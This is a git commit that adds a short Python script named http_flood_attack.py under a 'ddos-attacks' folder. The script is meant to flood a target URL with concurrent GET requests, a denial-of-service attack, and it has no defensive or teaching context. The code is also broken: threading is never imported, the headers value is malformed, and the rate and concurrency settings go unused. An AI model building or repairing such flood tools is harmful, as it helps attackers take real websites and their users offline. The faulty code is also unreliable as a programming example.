92cce388131ccdd6dc9612853d3eeacdbaef216e
natting04 <natalie.tingos@strathmore.edu>
2024-07-20 14:32:49 +0300

    ...

---
+++ ddos-attacks/http_flood_attack.py
@@ -0,0 +1,17 @@
+import requests
+import random
+
+target_url = ""
+concurrency = 100
+requests_per_second = 100
+
+def send_request():
+    headers = {"User-Agent" "Mozilla/5.0"}
+    response = requests.get(target_url, headers=headers)
+    return response.status_code
+
+for _ in range(concurrency):
+    thread = threading.Thread(target=send_request)
+    thread.start()
+
+    print("HTTP Flood attack finished!")
